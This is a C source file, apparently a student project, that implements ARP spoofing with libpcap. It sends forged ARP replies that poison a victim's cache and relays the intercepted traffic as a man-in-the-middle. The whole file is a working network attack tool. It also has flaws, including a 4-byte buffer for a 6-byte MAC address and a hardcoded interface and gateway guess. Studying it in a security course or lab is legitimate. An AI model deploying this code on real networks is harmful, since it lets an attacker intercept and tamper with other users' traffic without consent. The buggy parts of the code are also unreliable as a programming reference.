#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <memory.h>
#include <unistd.h>
#include <pthread.h>

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN     4
#define ARP_FRAME_TYPE  0x0806
#define ETHER_HW_TYPE   0x0001
#define IP_PROTO_TYPE   0x0800
#define OP_ARP_REQUEST  0x0002
#define OP_TYPE_REQUEST 0x0001
#define OP_TYPE_REPLY	0x0002

#define ARP_PACKET_LEN	42



struct arp_pk {
	 uint8_t DES_MAC[ETH_HW_ADDR_LEN];
	 uint8_t SRC_MAC[ETH_HW_ADDR_LEN];
	 uint16_t ETH_TYPE;
	 uint16_t HW_TYPE;
	 uint16_t PRO_TYPE;
	 uint8_t  HW_SIZE;
	 uint8_t PRO_SIZE;
	 uint16_t OP;
	 uint8_t  SENDER_MAC[ETH_HW_ADDR_LEN]; // MAC 은 6바이트
	 uint8_t  SENDER_IP[IP_ADDR_LEN];	   // IP 는 4바이트
	 uint8_t  TARGET_MAC[ETH_HW_ADDR_LEN]; 
	 uint8_t  TARGET_IP[IP_ADDR_LEN];
};


int main(int argc, char* argv[]){


	if(argc != 4) {
	printf("error, it should be like this :./arp_spoof <interface> <sender ip 1> <target ip 1>\n");
	//printf("error, it should be like this :./arp_spoof <interface> <sender ip 1> <target ip 1> <sender ip 2> <target ip 2>\n");
	return -1;
	}

	printf("%s, %s\n",argv[2],argv[3]);


	unsigned int iMac[6]; // temp MAC 담는 곳 

	uint8_t myMAC[6];
	uint8_t myIP[4];
	uint8_t gatewayIP[4];
	uint8_t gatewayMAC[4];
	uint8_t senderMAC[6]; // 기본적으로 가지고 있어야 할 myMAC, myIP, gatewayIP, gatewayMAC 선언. 아래서 값 넣어줌

	struct arp_pk arp_pk; // 내가 만든 arp_pk struct 선언


///////////////////////////// GET My MAC /////////////////////////////////// 


	FILE *fp2;
	fp2 = fopen("/sys/class/net/eth0/address","r"); // READ My MAC Addr 
	fscanf(fp2, "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);

	for(int i=0;i<6;i++)
	{		
		arp_pk.SRC_MAC[i] = (uint8_t)iMac[i]; // insert my mac addr to mac[i] 	
		arp_pk.SENDER_MAC[i] = (uint8_t)iMac[i]; // insert my mac addr to mac[i] 	
		printf("%x ",arp_pk.SENDER_MAC[i]);
	}
	
	printf(": MY MAC \n");
	fclose(fp2);

///////////////////////////// GET MY MAC END //////////////////////////////

////////// SETUP sender ip, target ip, attacker(my) ip, attacker(my) MAC, gateway ip ////////////////////


		char pipe_buf[100];

		system("ifconfig | grep inet | head -1 | gawk '{printf $2}'>ip.txt");
		FILE *ip = fopen("ip.txt", "r");
		fscanf(ip, "%s", pipe_buf);
		inet_aton((const char*)pipe_buf, (uint8_t*)myIP);
		inet_aton((const char*)pipe_buf, (uint8_t*)gatewayIP);
		for (int i = 0; i<4; i++)
		{
			// printf("%x ",myIP[i]);
		}
		// printf(" > My IP\n");
		fclose(ip);



		gatewayIP[3] = 1; // gateway 는 내 ip 에서 마지막 1인 녀석
		for (int i = 0; i<4; i++)
		{
			// printf("%x ",gatewayIP[i]);
		}
		// printf(" > Gateway IP\n");
			


		system("ifconfig | grep ether | gawk '{printf $2}' | tr ':' ' '>mac.txt");
		FILE *mmac = fopen("mac.txt", "r");
		for (int i = 0; i<6; i++)
		{
			fscanf(mmac, "%x", (uint8_t*)&myMAC[i]);
			// printf("%x ",myMAC[i]);
		}
		// printf(" > My Mac\n");
		fclose(mmac);

////////////////////////////   SET UP END   ///////////////////////////////////////////



// 공격자 MAC 얻기 위하여 ARP REQUEST 보내기



		 arp_pk.SENDER_IP[0] = myIP[0];       
		 arp_pk.SENDER_IP[1] = myIP[1];  
		 arp_pk.SENDER_IP[2] = myIP[2]; 
		 arp_pk.SENDER_IP[3] = myIP[3]; 
       printf("my ip  : %x.%x.%x.%x => %x %x %x %x\n", myIP[0], myIP[1], myIP[2], myIP[3], arp_pk.SENDER_IP[0],arp_pk.SENDER_IP[1],arp_pk.SENDER_IP[2],arp_pk.SENDER_IP[3]);


		 arp_pk.TARGET_IP[0] = gatewayIP[0];       
		 arp_pk.TARGET_IP[1] = gatewayIP[1];  
		 arp_pk.TARGET_IP[2] = gatewayIP[2]; 
		 arp_pk.TARGET_IP[3] = gatewayIP[3]; 
       printf("sender ip  : %x => %x %x %x %x\n", argv[3], arp_pk.TARGET_IP[0],arp_pk.TARGET_IP[1],arp_pk.TARGET_IP[2],arp_pk.TARGET_IP[3]);

		arp_pk.DES_MAC[0] = '\xff';
	arp_pk.TARGET_MAC[0] = '\x00';
		arp_pk.DES_MAC[1] = '\xff';
	arp_pk.TARGET_MAC[1] = '\x00';
		arp_pk.DES_MAC[2] = '\xff';
	arp_pk.TARGET_MAC[2] = '\x00';
		arp_pk.DES_MAC[3] = '\xff';
	arp_pk.TARGET_MAC[3] = '\x00';
		arp_pk.DES_MAC[4] = '\xff';
	arp_pk.TARGET_MAC[4] = '\x00';
		arp_pk.DES_MAC[5] = '\xff';
	arp_pk.TARGET_MAC[5] = '\x00';

	for(int i=0;i<6;i++)
	{
		arp_pk.SRC_MAC[i] = myMAC[i];
		arp_pk.SENDER_MAC[i] = myMAC[i];
		// printf("%x ",arp_pk.SENDER_MAC[i]);
	}

	arp_pk.ETH_TYPE = htons(ARP_FRAME_TYPE);
	arp_pk.HW_TYPE = htons(ETHER_HW_TYPE);
	arp_pk.PRO_TYPE = htons(IP_PROTO_TYPE);
	arp_pk.HW_SIZE = ETH_HW_ADDR_LEN;
	arp_pk.PRO_SIZE = IP_ADDR_LEN;
	arp_pk.OP = htons(OP_TYPE_REQUEST);





	u_char *packet;
	u_char *packet_relay;

	packet = (u_char *)malloc(sizeof(u_char) * 42);
	memset(packet, 0, 42);

	pcap_t *handle;			
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;



	memcpy(packet, &arp_pk, sizeof(arp_pk));


	char* dev = argv[1];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s: %s\n",dev , errbuf);
		return -2;
	}	

	////////////////////////

		if(pcap_sendpacket(handle, packet, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));


		while (1) {
		
		u_char eth[3][6];
	    int j = 6;
	    struct pcap_pkthdr* header;
	    const u_char* packet2;
	    int res = pcap_next_ex(handle, &header, &packet2);
	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;

	    for(int i = 0; i < header -> len; i++){
	   
	      if(i < 14 ){
	        eth[i%j][i - (i%j)*6] = packet2[i]; 
	      }

	    }
	    

	    printf("\n1\n");
	    printf("Eth Source : %0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x \n",eth[0][0],eth[0][1],eth[0][2],eth[0][3],eth[0][4],eth[0][5]);
	    printf("Eth Destination : %0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x \n",eth[1][0],eth[1][1],eth[1][2],eth[1][3],eth[1][4],eth[1][5]);
	    printf("Eth type : %0.2x %0.2x",eth[2][0],eth[2][1]);


	    printf("TARGET_IP : %0.2x.%0.2x.%0.2x.%0.2x \n",packet2[26],packet2[27],packet2[28],packet2[29]);
	    printf("TARGET_MAC : %0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x \n",packet2[6],packet2[7],packet2[8],packet2[9],packet2[10],packet2[11]);


	    gatewayMAC[0] = packet2[6];
	    gatewayMAC[1] = packet2[7];
	    gatewayMAC[2] = packet2[8];
	    gatewayMAC[3] = packet2[9];
	    gatewayMAC[4] = packet2[10];
	    gatewayMAC[5] = packet2[11];


	    break; 

	  }

	////////////////////////

		 arp_pk.SENDER_IP[0] = myIP[0];
		 arp_pk.SENDER_IP[1] = myIP[1];
		 arp_pk.SENDER_IP[2] = myIP[2]; 
		 arp_pk.SENDER_IP[3] = myIP[3]; 
       printf("sender ip  : %x %x %x %x\n", arp_pk.SENDER_IP[0],arp_pk.SENDER_IP[1],arp_pk.SENDER_IP[2],arp_pk.SENDER_IP[3]);

       uint32_t num_32 = inet_addr(argv[2]);
		 arp_pk.TARGET_IP[0] = num_32;       
		 arp_pk.TARGET_IP[1] = num_32 >> 8;  
		 arp_pk.TARGET_IP[2] = num_32 >> 16; 
		 arp_pk.TARGET_IP[3] = num_32 >> 24; 
       printf("target ip  : %x %x %x %x\n", arp_pk.TARGET_IP[0],arp_pk.TARGET_IP[1],arp_pk.TARGET_IP[2],arp_pk.TARGET_IP[3]);

	memcpy(packet, &arp_pk, sizeof(arp_pk));
	if(pcap_sendpacket(handle, packet, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));


	while (1) {
	
	u_char eth[3][6];
    int j = 6;
    struct pcap_pkthdr* header;
    const u_char* packet2;
    int res = pcap_next_ex(handle, &header, &packet2);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    for(int i = 0; i < header -> len; i++){
   
      if(i < 14 ){
        eth[i%j][i - (i%j)*6] = packet2[i]; 
      }

    }

    if(eth[2][0] == 0x08 && eth[2][1] == 0x06){
    

    printf("\n2\n");
    printf("Eth Source : %0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x \n",eth[0][0],eth[0][1],eth[0][2],eth[0][3],eth[0][4],eth[0][5]);
    printf("Eth Destination : %0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x \n",eth[1][0],eth[1][1],eth[1][2],eth[1][3],eth[1][4],eth[1][5]);
    printf("Eth type : %0.2x %0.2x\n",eth[2][0],eth[2][1]);


    printf("TARGET_IP : %0.2x.%0.2x.%0.2x.%0.2x \n",packet2[26],packet2[27],packet2[28],packet2[29]);
    printf("TARGET_MAC : %0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x \n",packet2[6],packet2[7],packet2[8],packet2[9],packet2[10],packet2[11]);


	  	// 새로운 ARP 스푸핑 위하여
    	senderMAC[0] = packet2[6];
    	senderMAC[1] = packet2[7];
    	senderMAC[2] = packet2[8];
    	senderMAC[3] = packet2[9];
    	senderMAC[4] = packet2[10];
    	senderMAC[5] = packet2[11];
    	printf("SENDER MAC!! : %x:%x:%x:%x:%x:%x\n", senderMAC[0],senderMAC[1],senderMAC[2],senderMAC[3],senderMAC[4],senderMAC[5]);

    	// printf("\n gatewayIP :???%x.%x.%x.%x\n", myIP[0],myIP[1],myIP[2],gatewayIP[3]);
    	 arp_pk.SENDER_IP[0] = myIP[0];
		 arp_pk.SENDER_IP[1] = myIP[1];
		 arp_pk.SENDER_IP[2] = myIP[2]; 
		 arp_pk.SENDER_IP[3] = gatewayIP[3]; 

			arp_pk.DES_MAC[0] = packet2[6];
		arp_pk.TARGET_MAC[0] = packet2[6];
			arp_pk.DES_MAC[1] = packet2[7];
		arp_pk.TARGET_MAC[1] = packet2[7];
			arp_pk.DES_MAC[2] = packet2[8];
		arp_pk.TARGET_MAC[2] = packet2[8];
			arp_pk.DES_MAC[3] = packet2[9];
		arp_pk.TARGET_MAC[3] = packet2[9];
			arp_pk.DES_MAC[4] = packet2[10];
		arp_pk.TARGET_MAC[4] = packet2[10];
			arp_pk.DES_MAC[5] = packet2[11];
		arp_pk.TARGET_MAC[5] = packet2[11];

		arp_pk.OP = htons(OP_TYPE_REPLY);
		
		memcpy(packet, &arp_pk, sizeof(arp_pk));

		break;
	}

    continue; 

  } // arp reply 가 바로 와서 보내자 마자 받은걸로 했는데, 
  // 내가 만약 유튜브를 보고 있는 상황이라면? 이때는 다른 패킷이 들어올 수 있기때문에, 수정해줘야함


/////////////////////////////////첫 arp packet 만들기 끝 ////////////////////////


  // 일단 첫 arp 스푸핑 ㄱㄱ

  	for( int i = 0 ; i < 10; i++){
		printf("Send ARP [%d]\n",i);
		if(pcap_sendpacket(handle, packet, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
		sleep(1);
	}

	u_char pac[10000] = { 0 };

	while (1) {
	
	u_char eth[3][6];
    int j = 6;

    struct pcap_pkthdr* header;
    const u_char* packet2;
    int res = pcap_next_ex(handle, &header, &packet2);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    for(int i = 0; i < header -> caplen; i++ ){
		pac[i] = packet2[i];
	}


    if(packet2[6]==senderMAC[0]&& packet2[7]==senderMAC[1]&& packet2[8]==senderMAC[2]&& packet2[9]==senderMAC[3]&& packet2[10]==senderMAC[4]&& packet2[11]==senderMAC[5]){ // SOURCE MAC 이 Sender꺼라면 ARP 인지 확인, 아니면 그냥 spoofing packet send

    	printf("Sender 꺼 찾음!!!");
    	if((header -> caplen >= 34) && (packet2[12] == 0x08) && (packet2[13] == 0x06)){ // ARP 이면 spoofing , ARP 아니면 ETH MAC 바꿔서 보내주기 
    		printf(" : ARP! \n");
    		pcap_sendpacket(handle, packet, 42); 
    	}
    	else{
    		printf(" : 넘겨!!!!!!!!!!!!!!!!!!!!! \n");

			// Eth Destination
    		pac[0] = gatewayMAC[0];
    		pac[1] = gatewayMAC[1];
    		pac[2] = gatewayMAC[2];
    		pac[3] = gatewayMAC[3];
    		pac[4] = gatewayMAC[4];
    		pac[5] = gatewayMAC[5];
    		// Eth Source
    		pac[6] = myMAC[0];
    		pac[7] = myMAC[1];
    		pac[8] = myMAC[2];
    		pac[9] = myMAC[3];
    		pac[10] = myMAC[4];
    		pac[11] = myMAC[5];

    		printf("packet relay!\n\n");
    		pcap_sendpacket(handle, pac, header -> len); 

    	}


    }
    else{
    	printf("Sender 꺼 아님\n");

    	// Eth Destination
    		pac[0] = senderMAC[0];
    		pac[1] = senderMAC[1];
    		pac[2] = senderMAC[2];
    		pac[3] = senderMAC[3];
    		pac[4] = senderMAC[4];
    		pac[5] = senderMAC[5];
    		// Eth Source
    		pac[6] = myMAC[0];
    		pac[7] = myMAC[1];
    		pac[8] = myMAC[2];
    		pac[9] = myMAC[3];
    		pac[10] = myMAC[4];
    		pac[11] = myMAC[5];

    		printf("다보내~~!\n\n");
    		pcap_sendpacket(handle, pac, header -> len); 
    	
    }


  	}




        return 0;

}





